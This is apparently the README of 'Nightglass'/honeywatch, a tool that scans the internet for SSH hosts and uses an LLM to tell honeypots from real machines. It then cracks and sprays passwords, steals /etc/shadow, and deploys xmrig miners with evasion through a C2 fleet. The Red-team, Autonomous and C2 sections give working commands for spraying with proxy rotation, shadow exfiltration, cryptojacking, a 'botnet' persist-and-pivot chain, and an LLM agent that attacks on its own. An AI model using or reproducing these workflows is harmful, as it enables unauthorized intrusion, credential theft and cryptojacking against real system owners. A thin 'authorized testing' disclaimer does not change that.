# Nightglass

A planet-scale SSH honeypot scanner with AI confidence scoring, red-team credential cracking, payload deployment, and a C2 pipeline — for security research and authorized testing.

> **Nightglass** is the project name; **`honeywatch`** is the CLI you run.

---

## Overview

`honeywatch` runs an end-to-end pipeline against SSH-bearing hosts:

```
scan → fingerprint → heuristic score → Ollama AI verdict → persist
    → crack → grab → hashcrack → deploy → C2
```

Each stage is optional and degrades gracefully — run only the scan, or close the full loop through autonomous cryptojacker deployment.

### At a glance

| | |
|---|---|
| **Python** | 3.10+ (tested through 3.14) |
| **Runtime dependencies** | Zero — pure standard library (`asyncio`, `sqlite3`, `tomllib`, `urllib.request`, `hashlib`, `json`, `xml.etree`) |
| **Optional extras** | `full` (paramiko) · `c2` (aiohttp + websockets) · `dev` (pytest) |
| **Platform** | Linux (full pipeline) · Windows (explicit-host mode) · WSL2 recommended on Windows |
| **License** | MIT — see [LICENSE](./LICENSE) |
| **Status** | `0.1.0` — early; APIs may shift |

### Pipeline

<details>
<summary>Full pipeline diagram</summary>

```
╔══════════════════════════════════════════════════════════════════════════╗
║                          honeywatch pipeline                             ║
╚══════════════════════════════════════════════════════════════════════════╝

  ┌───────────┐      ┌───────────┐
  │  masscan  │      │   zmap    │     network discovery (Linux-only tools)
  │ 0.0.0.0/0 │      │  target   │     optional — hand-picked targets work too
  └─────┬─────┘      └─────┬─────┘
        │                  │
        └─────── port 22 SYN ───────┘
                         │
                         ▼
               ┌─────────────────────┐
               │  hits: ip:22 open   │
               └──────────┬──────────┘
                          │   asyncio, concurrency=512, timeout_s=6
                          ▼
       ┌──────────────────────────────────────┐
       │   SSH fingerprint (per host)         │
       │   fast: banner · RFC4253 KEXINIT ·   │
       │         connect/banner timing        │
       │   full: + host-key type & SHA-256    │  (paramiko)
       └─────────────────┬────────────────────┘
                         │
                         ▼
       ┌──────────────────────────────────────┐
       │   rule-based Signals                 │
       │   heuristic score + anomalies/flags  │
       └─────────────────┬────────────────────┘
                         │  group by identical profile
                         ▼
       ┌──────────────────────────────────────┐
       │   ONE Ollama verdict per unique      │
       │   profile  →  AI confidence + label  │
       └─────────────────┬────────────────────┘
                         │
                         ▼
       ┌──────────────────────────────────────┐
       │   Score → SQLite + reports           │
       │   (JSON / CSV / Markdown)            │
       └─────────────────┬────────────────────┘
                         │  label=real/likely_real hosts
                         ▼
       ┌──────────────────────────────────────┐
       │   crack: SSH password guessing       │  (paramiko)
       │   wordlist + mutations · per-host    │
       │   concurrency · stops on first hit   │
       └─────────────────┬────────────────────┘
                         │  recovered creds → credentials table
                         ▼
       ┌──────────────────────────────────────┐
       │   deploy: payload manifests         │
       │   (auto-fills ssh_user/ssh_pass from │
       │    the cracked credential store)    │
       └─────────────────┬────────────────────┘
                         │
                         ▼
       ┌──────────────────────────────────────┐
       │   C2 controller + worker fleet       │
       │   ssh exec (key or sshpass password) │
       │   → fetch/build/run payload on target │
       └──────────────────────────────────────┘
```

</details>

1. **Discover** — Run `masscan` or `zmap` over a target range, or pass hosts directly. A "hit" is any `ip:22` that accepts a TCP connection.
2. **Probe** — An asyncio pool (default 512 concurrent, 6 s timeout) fingerprints each open port. `fast` mode captures the banner, the RFC 4253 `SSH_MSG_KEXINIT` (kex / host-key / cipher / MAC / compression algorithms), and connect/banner timing. `full` mode (requires `paramiko`) completes a real key exchange to capture the host-key type and SHA-256 fingerprint.
3. **Signal** — The rule engine turns each fingerprint into anomalies, flags, evidence, and a heuristic score in `[0, 1]`.
4. **AI verdict** — Fingerprints are grouped by an identity profile (normalized banner + algorithm set + host key). Each unique profile gets one LLM prompt; every host sharing that profile inherits the verdict. This makes large-scale AI scoring practical.
5. **Persist** — Final scores (heuristic + AI) are written to SQLite and rendered to JSON / CSV / Markdown. Recovered credentials flow back into the same store so `deploy` can auto-fill `ssh_user`/`ssh_pass` from the cracked credential table.

Full data-flow, concurrency, and resumability: [`docs/pipeline.md`](docs/pipeline.md).

---

## Safety & legal

> **Scanning networks you do not own, or are not explicitly authorized to test, may be illegal** under the US Computer Fraud and Abuse Act (CFAA), the UK Computer Misuse Act, the EU's NIS/cybercrime frameworks, and equivalent national law worldwide — and can get your IP banned, your hosting account terminated, or worse.

- honeywatch ships with a **conservative default rate** (`scanners.masscan.rate = 1000` packets/s). Internet-scale scanning from a data-center IP against networks you don't own is how people get felony charges, not fun.
- Use `--max-hosts` to bound how much of an external range you touch.
- `masscan` and `zmap` require **root** (raw sockets) and are **Linux-only**. `nmap` is cross-platform and needs no raw sockets for `-sV`.
- **Honeypot detection is probabilistic, not truth.** Both the heuristic engine and the LLM return confidence, not truth. A "real" label means "consistent with a real SSH stack"; a "honeypot" label means "evidence strongly suggests a honeypot." Do not make perimeter calls on a single scan.
- **No warranty.** honeywatch is provided as-is for security research and authorized testing.
- `masscan`, `zmap`, `nmap`, and `paramiko` are their own projects with their own licenses; honeywatch only orchestrates them.

Full legal disclaimer and abuse-reporting guidance: [`docs/security.md`](docs/security.md).

---

## Installation

### Prerequisites

- **Python 3.10+**
- **Mullvad VPN** — required for `scan` and `probe` (the gate refuses to start without it). Pass `--skip-vpn-check` or set `HONEYWATCH_SKIP_VPN=1` for offline/controlled lab use. On gate failure the CLI prints `REFUSAL` and exits code 2. Details: [`docs/vpn.md`](docs/vpn.md).
- **External binaries are not bundled.** Install the ones you need:

  ```bash
  sudo apt-get install -y masscan zmap nmap sshpass hashcat john
  ```

  | Binary | Platform | Needs root? | Role |
  |---|---|---|---|
  | `masscan` | Linux | Yes (raw sockets) — or `sudo setcap cap_net_raw+ep $(which masscan)` | Fast SYN discovery; default rate 1000 pps |
  | `zmap` | Linux | Yes (raw sockets) | Single-port discovery |
  | `nmap` | Linux + Windows | No | Optional single-host version probe |
  | `sshpass` | Linux | No | High-opsec password spray (preserves genuine OpenSSH fingerprint) |
  | `hashcat` | Linux + Windows | No (GPU/OpenCL runtime) | GPU hash cracking; Windows via `--bin` |
  | `john` | Linux + Windows | No | CPU hash cracking |

### Linux (recommended)

**Quick path** — bundled setup script (creates a venv and installs the package in editable mode with all extras). Do **not** run as root:

```bash
git clone https://github.com/CL-BAF/Nightglass.git
cd Nightglass
./setup.sh
```

`setup.sh` provisions a Python venv, installs `honeywatch -e .[full,c2,dev]`, and prints the next step. Details: [`docs/installation.md`](docs/installation.md).

**Manual path:**

```bash
python3 -m venv .venv
source .venv/bin/activate
pip install -e .                 # core: stdlib-only, no required deps
pip install -e .[full,c2,dev]    # all optional extras
honeywatch --version             # smoke check
```

`requirements.txt` is also provided with every optional dependency commented out — uncomment the lines you need and `pip install -r requirements.txt`.

### Windows

Explicit-host mode only — `crack`, `spray`, `grab`, and `deploy` against hosts you name explicitly. There is no native `masscan`/`zmap` (Linux-only raw-socket tools), and the high-opsec `sshpass` spray backend is unavailable (a stdlib fallback exists but carries a different SSH fingerprint). `nmap` runs natively on Windows.

For the full pipeline on Windows, use **WSL2** (`wsl --install -d Ubuntu`) or a Linux VPS — then follow the Linux path above.

`hashcat.exe` and the John the Ripper Windows build work via `--bin`:

```bash
honeywatch hashcrack shadow.txt --wordlist rockyou.txt --tool hashcat \
    --bin C:\Tools\hashcat.exe
```

### Optional extras

| Extra | Packages | Purpose |
|---|---|---|
| `full` | `paramiko>=3.0` | Full-depth host-key probe (RFC 4253 negotiation, `--probe-level full`) |
| `c2` | `aiohttp>=3.8`, `websockets>=12.0` | C2 dashboard + worker WebSocket transport |
| `dev` | `pytest>=7.0` | Development / test tooling |

Install any combination: `pip install -e .[full,c2,dev]`.

---

## Quickstart

1. **Set `OLLAMA_API_KEY`.** Required for AI verdicts. Without it you get heuristic-only scores (the pipeline falls back gracefully and prints a stderr warning). Create a key at [ollama.com/settings/keys](https://ollama.com/settings/keys).

   ```bash
   export OLLAMA_API_KEY=sk-...
   ```

2. **Be on Mullvad** (the gate is enforced on `scan`/`probe`). For offline or controlled lab use, pass `--skip-vpn-check`.

3. **Run a bounded scan:**

   ```bash
   honeywatch scan 192.0.2.0/24 --max-hosts 50
   ```

   Writes `scan-<stamp>.{json,csv,md}` into `--out-dir` (default `reports/`, override via `storage.reports_dir`) and upserts scores into the SQLite store (default `honeywatch.db`, override via `storage.db`).

4. **View results:**

   ```bash
   honeywatch stats                       # aggregate counts by label and flag
   honeywatch report --format md --top 20 # write a top-20 markdown report
   ```

Full walkthrough: [`docs/quickstart.md`](docs/quickstart.md). Complete CLI reference: [`docs/cli.md`](docs/cli.md).

---

## Commands

Per-flag detail: `honeywatch <cmd> --help` or [`docs/cli.md`](docs/cli.md).

### Discovery & scoring

| Command | Purpose | Reference |
|---|---|---|
| `scan TARGETS` | Scan, probe SSH hosts, score honeypot confidence, persist to store + reports | [`docs/pipeline.md`](docs/pipeline.md) |
| `probe host` | Fingerprint and classify a single SSH host (`--json` for machine output) | [`docs/fingerprinting.md`](docs/fingerprinting.md) |
| `stats` | Aggregate statistics from the local store | [`docs/reports.md`](docs/reports.md) |
| `report` | Write JSON / CSV / Markdown reports from the store | [`docs/reports.md`](docs/reports.md) |
| `config` | Print or write (`--write PATH`) the default configuration | [`docs/configuration.md`](docs/configuration.md) |

### Red-team operations

| Command | Purpose | Reference |
|---|---|---|
| `crack HOSTS` | Online SSH password cracking (wordlist + mutations, stops on first hit) | [`docs/crack.md`](docs/crack.md) |
| `spray HOSTS` | Lockout-aware password spraying (one password across many users) | [`docs/opsec.md`](docs/opsec.md) |
| `hashcrack shadow` | Offline hash cracking of `/etc/shadow` with hashcat or john | [`docs/crack.md`](docs/crack.md) |
| `grab host` | SFTP-exfil `/etc/shadow` from a popped host using cracked creds | [`docs/crack.md`](docs/crack.md) |
| `creds` | List cracked SSH credentials stored by `crack` | [`docs/crack.md`](docs/crack.md) |
| `deploy payload_id` | Build and enqueue a payload deployment | [`docs/payloads.md`](docs/payloads.md) |

### C2 (command & control)

| Command | Purpose | Reference |
|---|---|---|
| `c2` | Start the C2 controller / dashboard (aiohttp web server) | [`docs/c2.md`](docs/c2.md) |
| `worker` | Start a C2 worker node (pull-based, claims tasks by category) | [`docs/c2.md`](docs/c2.md) |

### Autonomous

| Command | Purpose | Reference |
|---|---|---|
| `agent` | Run the Ollama-model-driven autonomous loop (15 tools, self-halts on DONE) | [`docs/agent.md`](docs/agent.md) |
| `botnet TARGETS` | Run the deterministic 7-phase recon→…→pivot chain | [`docs/ops.md`](docs/ops.md) |
| `chat` | Interactive operator console REPL for the AI agent | [`docs/agent.md`](docs/agent.md) |
| `setup` | Configure the AI agent and default mining wallet (wizard or non-interactive) | [`docs/agent.md`](docs/agent.md) |

---

## AI confidence scoring

The feature that distinguishes honeywatch from a banner-grabber: heuristic signals fused with an LLM verdict.

**Fusion formula.** When an AI verdict exists, `final_confidence = round(ai.confidence * 0.6 + heuristic_score * 0.4, 4)`; otherwise `final_confidence = heuristic_score` (pure heuristic fallback). Labels map from the float:

| Confidence | Label |
|---|---|
| `< 0.2` | `real` |
| `< 0.4` | `likely_real` |
| `< 0.6` | `uncertain` |
| `< 0.8` | `likely_honeypot` |
| `≥ 0.8` | `honeypot` |

**Per-profile batching** — the key cost decision:

- **One LLM call per unique profile, not per host.** A honeypot farm of 10,000 identical hosts costs one call.
- **Cost scales with distinct software identities** (small), not address-space size (huge).
- **Labeling is stable** — the verdict for profile X is shared by all its members, so a 50k-host cluster gets a single auditable decision.
- Batches run over a single cloud connection with a 120 s timeout; chunks of `batch_size=100` profiles run concurrently via `asyncio.gather`, and any profile missing from a batch response is retried with its own dedicated call.

**Graceful degradation:**

- `OLLAMA_API_KEY` missing / Ollama Cloud unreachable → `AiScorer.score` returns `{}`, the pipeline emits a stderr warning and falls back to pure heuristic scores.
- `paramiko` missing → `--probe-level full` records `paramiko unavailable: <exception>` and returns the fast-stage fingerprint; `level="fast"` (default) never imports paramiko.

Full AI config and internals: [`docs/ai-integration.md`](docs/ai-integration.md), [`docs/configuration.md`](docs/configuration.md).

---

## Heuristic signals

The flags every scan output references.

| Signal | What the probe saw | Why it suggests honeypot |
|---|---|---|
| `no_banner` | TCP accept, nothing sent before timeout | Many stubs never emit a banner |
| `immediate_banner` | Banner in < ~5 ms with no stack jitter | Deterministic script, no real protocol |
| `banner_version_mismatch` | Banner software/version contradicts KEXINIT algorithm set | Banners are pasted; KEXINIT is real code |
| `obsolete_algorithms` | Modern-sounding banner + only legacy kex/ciphers | Thin stacks implement few algorithms |
| `no_kexinit` | No `SSH_MSG_KEXINIT` after the banner | Deeper protocol never arrives |
| `kexinit_inconsistent` | Self-contradictory algorithm lists | Hand-assembled packet data |
| `duplicate_host_key` | Same host-key SHA-256 across many IPs | Shared key = classic honeypot farm |
| `weak_host_key` | DSA / 512-bit RSA / odd key type | Canned test keys shipped with honeypot |
| `banner_reuse` | Identical banner string across many IPs | Copy-pasted banner farms |
| `host_key_reuse` | Known-bad host key hash (from `known_hashes` set) | Fingerprint matches a catalogued honeypot |
| `misc_mismatch` | Port 22 on a host whose behavior looks like a VM image | Probabilistic combination |

Scoring weights, `known_hashes` learning across runs, and farm detection: [`docs/heuristic-signals.md`](docs/heuristic-signals.md).

---

## Red-team operations

A four-phase pipeline that closes the loop through a SQLite credential store:

```
scan (fingerprint) → score (AI label + confidence)
  → crack/spray (online SSH guessing, opsec-hardened, stops on first hit)
  → Store.upsert_credential (persisted, source=crack|spray|hashcrack)
  → grab (SFTP /etc/shadow) → hashcrack (offline hashcat/john) → Store
  → deploy (registry payload, targeting by label/confidence, exec modes,
            integrity-gated, evasion-chained) → C2 worker executes on target
  → spray --reuse-creds (fleet password reuse = growth loop)
```

**Opsec defaults** — `spray` and `botnet` bake in: business-hours window (08:00–18:00 local weekdays), jitter on top of base delay, `lockout-delay` backoff when a guess looks like a ban, source rotation via `--proxy-file` (socks5 round-robin) and `--jump-file` (SSH jumps), and per-host concurrency kept modest (default 8) to avoid sshd throttling. Full opsec detail: [`docs/opsec.md`](docs/opsec.md).

| Phase | Commands | Reference |
|---|---|---|
| Online credential guessing | `crack`, `spray` | [`docs/crack.md`](docs/crack.md), [`docs/opsec.md`](docs/opsec.md) |
| Offline hash cracking + exfil | `hashcrack`, `grab` | [`docs/crack.md`](docs/crack.md) |
| Payload deployment | `deploy` | [`docs/payloads.md`](docs/payloads.md) |

**Payload registry** — ten IDs across three categories:

| Category | IDs |
|---|---|
| `miner` | `xmrig`, `xmrigcc`, `stratum` |
| `exploit` | `metasploit` |
| `evasion` | `upx`, `packers`, `obfuscators`, `symbol_strip`, `anti_debug`, `anti_vm` |

Evasion chaining and the integrity manifest (`--require-integrity` closes the blind `curl|tar|exec` gap): [`docs/payloads.md`](docs/payloads.md).

### Examples

```bash
# Crack one host with a wordlist + mutations, stop on first hit
honeywatch crack 10.0.0.5 --wordlist rockyou.txt --max-attempts 2000

# Pull targets from the store by label + confidence, pin one user
honeywatch crack --target-label real --min-confidence 0.8 --user root \
    --wordlist passwords.txt --host-concurrency 64

# Spray one password across a fleet, business-hours only, with source rotation
honeywatch spray --target-label real --min-confidence 0.7 \
    --users root,admin,ubuntu --passwords 'Summer2024!' \
    --delay 2 --jitter 1.5 --lockout-delay 30 --business-hours \
    --proxy-file proxies.txt --jump-file jumps.txt --host-concurrency 16

# Fleet reuse: spray every stored password across every discovered host
honeywatch spray --reuse-creds --delay 5 --jitter 2 --business-hours

# Exfil shadow from a popped host using a stored cred
honeywatch grab 10.0.0.5 --user root --pass 'crackedpw' --json

# Crack the exfiled shadow with hashcat (auto-detects mode per family)
honeywatch hashcrack /etc/shadow --wordlist rockyou.txt --tool hashcat \
    --ip 10.0.0.5 --port 22

# Dry-run: render xmrig scripts for high-confidence real hosts, don't enqueue
honeywatch deploy xmrig --target-label real --min-confidence 0.85 --limit 50 \
    --var pool=stratum+tcp://pool.example.org:4444 \
    --var wallet=4...xmr... --dry-run

# Deploy with chained evasion + integrity gating, ssh exec mode
honeywatch deploy xmrig --target-label real --min-confidence 0.8 \
    --var pool=stratum+tcp://pool.example.org:3333 --var wallet=4...xmr... \
    --var run_user=svc --evasion anti_vm,upx,symbol_strip,anti_debug \
    --exec-mode ssh --ssh-user root --ssh-key ~/.ssh/id_ed25519 \
    --integrity payloads/integrity.toml --require-integrity
```

---

## Autonomous modes

honeywatch has two distinct self-running modes:

### `botnet` — deterministic chain

A fixed, hand-coded 7-phase pipeline (`recon → enumerate → spray → foothold → escalate → persist → pivot`) with no model and no decisions. The orchestrator runs phases in fixed order, looping on growth — every pivot round that surfaces new hosts feeds back into enumeration. Durable state in SQLite so a killed run resumes.

### `agent` — model-driven

An Ollama model is in the driver's seat. Each cycle it observes live fleet state, decides the single highest-value next move, emits it as tool calls, and the host executes them. It can call any of 15 tools in any order, including `run_chain` to delegate a full deterministic `botnet` pass.

| | `honeywatch botnet` | `honeywatch agent` |
|---|---|---|
| **Driver** | Fixed hand-coded pipeline (`chain.py`). No model. | Ollama LLM (`ChatAgent.run_autonomous`). |
| **Decisions** | None — phases run in fixed order every round. | Per-cycle: model picks the highest-value move from live fleet state. |
| **Phases** | 7 fixed: recon→enumerate→spray→foothold→escalate→persist→pivot. | Open-ended — 15 tools in any order; can delegate to `run_chain`. |
| **Termination** | Growth exhausted, or `--max-rounds` reached (`0` = loop until growth exhausts). | `DONE=true`, stall, or `--max-cycles` reached (`0` = loop until DONE/stall). |

### Configure once first

`honeywatch setup` persists your Ollama key/model **and** the Monero mining destination — pool, wallet, worker, password, TLS — to the local `agent_setup` store. Once configured, `honeywatch botnet` and the agent's `deploy`/`run_chain` tools read pool/wallet/worker/TLS from that store by default, so you don't re-pass them every run; explicit `--pool`/`--wallet`/`--worker`/`--tls` always win. For a miner deploy (`xmrig`/`xmrigcc`), if the wallet and pool are set nowhere (neither on the command line nor in setup), the chain aborts the persist phase with an actionable error instead of silently deploying a miner that pays to nothing.

```bash
# Interactive wizard
honeywatch setup

# Non-interactive (automation / CI)
honeywatch setup --ollama-api-key sk-... --ollama-model llama3.1:8b \
    --pool stratum+tcp://pool.example.org:3333 --wallet <addr> --worker honeywatch --tls
```

### Examples

```bash
# botnet: 3-round chain against a /24, deploying xmrig.
# --pool/--wallet/--worker/--tls are OPTIONAL here — they default from `honeywatch setup`.
honeywatch botnet 10.0.0.0/24 \
  --users root,admin --passwords 'Summer2024!,Welcome1' \
  --payload xmrig --hashcrack-wordlist rockyou.txt

# (or pass them explicitly to override setup for just this run)
honeywatch botnet 10.0.0.0/24 --payload xmrig \
  --pool stratum+tcp://pool.example.org:3333 --wallet <addr> --worker honeywatch

# agent: autonomous 20-cycle run, business-hours only, logged for daemon use
honeywatch agent --business-hours --log /var/log/honeywatch-agent.log

# agent: true daemon — model self-halts on DONE/stall
honeywatch agent --max-cycles 0 --cycle-delay 30 --log /var/log/honeywatch-agent.log --json
```

Full 7-phase table, 15-tool table, failure handling, daemon logging: [`docs/ops.md`](docs/ops.md), [`docs/agent.md`](docs/agent.md).

---

## C2 controller & workers

A controller/worker model backed by a shared SQLite store. The controller is the single source of truth for operations and tasks; workers phone home to claim work and report results.

- **Controller** — aiohttp web server serving a dashboard (`/`), REST API (`/api/*`), and WebSocket (`/ws`). Requires the `c2` extra (`pip install -e .[c2]`).
- **Workers** — pull-based. Each polls `POST /api/tasks/claim` (or connects over WS), atomically claims one pending task matching its `--categories`, executes it, and POSTs the result. Claiming is atomic (single transaction, `cur.rowcount` check).
- **Exec modes** (`--exec-mode` / `deploy --exec-mode`): `dry_run` (build + print, no execute), `local_simulate` (run script locally), `ssh` (execute on target over SSH, key or `sshpass` password auth).
- **Hardened deploy** — `--generate-certs` creates a self-signed pair in `./certs`; `--api-token <secret>` gates every API + WS request with a constant-time bearer-token compare. A missing cert path raises rather than silently downgrading to plaintext.
- **Credential scoping** — credentials flow only to the executing worker (claim response) or an authenticated caller opting in with `?include_credentials=true`; dashboard and WS snapshots always receive the stripped form.

```bash
# Start the controller (HTTPS + bearer-gated API)
honeywatch c2 --generate-certs \
    --tls-cert certs/honeywatch.crt --tls-key certs/honeywatch.key \
    --api-token "$(openssl rand -hex 32)"

# Start a worker (SSH-executing, authenticated)
honeywatch worker --controller-url https://127.0.0.1:8443 \
    --categories miner --exec-mode ssh --ssh-user root \
    --ssh-key ~/.ssh/id_ed25519 --api-token SECRET
```

Route table, TLS generation, atomic-claim implementation, nginx template: [`docs/c2.md`](docs/c2.md), [`docs/api/c2.md`](docs/api/c2.md).

---

## Configuration

**Resolution order:** `--config PATH` → `$HONEYWATCH_CONFIG` → `./config.toml` if it exists → built-in defaults. Env overrides apply last, so they win. Partial TOML files deep-merge (only the keys you mention are overridden).

**Data & storage:** scores → `honeywatch.db` (SQLite); reports → `reports/`. Override via the `storage.db` and `storage.reports_dir` config keys.

### Environment variables

| Variable | Target | What it does |
|---|---|---|
| `OLLAMA_API_KEY` (or whatever `ai.api_key_env` points at) | `ai.api_key` | API key for Ollama Cloud. Required for AI verdicts. |
| `HONEYWATCH_MODEL` | `ai.model` | Override the Ollama Cloud model tag (default `llama3.1:8b`). |
| `HONEYWATCH_CONFIG` | (config file path) | Path to a TOML config file. A missing file is silently skipped. |
| `HONEYWATCH_SKIP_VPN` | vpn gate | Skip the Mullvad gate. Equivalent to `--skip-vpn-check`. |

Treat `honeywatch config --write` as authoritative for the full default set (the on-disk `config.example.toml` lags `default_config()`). Full 50-row config reference: [`docs/configuration.md`](docs/configuration.md), [`docs/api/config.md`](docs/api/config.md).

---

## Troubleshooting

**"masscan: command not found" / "zmap: command not found"**
→ `sudo apt install masscan zmap` (Debian) / `sudo dnf install masscan zmap` (Fedora).

**Running on Windows / macOS**
→ Use WSL2 (`wsl --install -d Ubuntu`) for the full pipeline. `honeywatch probe` is pure asyncio and works anywhere; `crack`/`spray`/`grab`/`deploy` work in explicit-host mode on Windows. `nmap` is cross-platform and runs natively.

**Ollama Cloud not responding / scores are heuristic-only**
→ `curl https://ollama.com/v1/models -H "Authorization: Bearer $OLLAMA_API_KEY"`; check `OLLAMA_API_KEY`; `ai.enabled=false` works as a fallback.

**Missing host key in `--probe-level full`**
→ `pip install paramiko`, else `full` silently falls back to `fast`.

**"Permission denied" / raw-socket errors from masscan/zmap**
→ Run as root, or `sudo setcap cap_net_raw+ep $(which masscan)` (and `zmap`).

**"I scanned and got a 100% `honeypot` run"**
→ Feed `known_hashes` to `features.analyze()` to whitelist verified hosts. Honeypot detection is probabilistic — a single scan is not truth.

---

## Documentation

The README is a hub into the `docs/` tree. The exhaustive list is at [`docs/index.md`](docs/index.md).

### Getting started

- [`docs/installation.md`](docs/installation.md) — full install detail, env vars, config resolution
- [`docs/quickstart.md`](docs/quickstart.md) — full first-scan walkthrough
- [`docs/cli.md`](docs/cli.md) — complete command reference (every flag)
- [`docs/configuration.md`](docs/configuration.md) — full 50-row config reference

### Reference

- [`docs/pipeline.md`](docs/pipeline.md) — end-to-end data flow, concurrency, resumability
- [`docs/fingerprinting.md`](docs/fingerprinting.md) — probe stages, KEXINIT parsing, full-mode caveat
- [`docs/heuristic-signals.md`](docs/heuristic-signals.md) — scoring weights, `known_hashes` learning, farm detection
- [`docs/ai-integration.md`](docs/ai-integration.md) — OllamaClient, profile batching, scorer internals
- [`docs/scanners.md`](docs/scanners.md) — masscan/zmap/nmap backends, large-scale tuning
- [`docs/payloads.md`](docs/payloads.md) — payload registry, evasion chaining, integrity manifests
- [`docs/c2.md`](docs/c2.md) — controller/worker model, routes, TLS, atomic claim
- [`docs/crack.md`](docs/crack.md) — online cracking, spraying, hashcrack, grab
- [`docs/opsec.md`](docs/opsec.md) — spraying opsec, source rotation, business-hours
- [`docs/reports.md`](docs/reports.md) — report writers and formats
- [`docs/storage.md`](docs/storage.md) — SQLite schema, resumability, known-keys learning
- [`docs/vpn.md`](docs/vpn.md) — Mullvad gate detection and opt-out

### Internals & guidance

- [`docs/architecture.md`](docs/architecture.md) — architecture notes, design decisions
- [`docs/security.md`](docs/security.md) — full legal disclaimer, reporting abuse
- [`docs/ops.md`](docs/ops.md) — autonomous chain (`botnet`), opsec
- [`docs/agent.md`](docs/agent.md) — autonomous AI agent (`agent`), chat, setup

### API reference

`docs/api/` — 15 files: `index`, `models`, `config`, `pipeline`, `fingerprint`, `ai`, `vpn`, `scanners`, `payloads`, `c2`, `ops`, `agent`, `cli`, `report`, `store`. Start at [`docs/api/index.md`](docs/api/index.md).

### Development

- [`docs/development/contributing.md`](docs/development/contributing.md)
- [`docs/development/testing.md`](docs/development/testing.md)

---

## Contributing & testing

Run the test suite:

```bash
python -m pytest        # or: pytest
```

Bugs and suggestions: [open an issue on GitHub](https://github.com/CL-BAF/Nightglass/issues).

## License

MIT — see [LICENSE](./LICENSE). `masscan`, `zmap`, `nmap`, `paramiko`, `hashcat`, and `john` are their own projects with their own licenses; honeywatch only orchestrates them.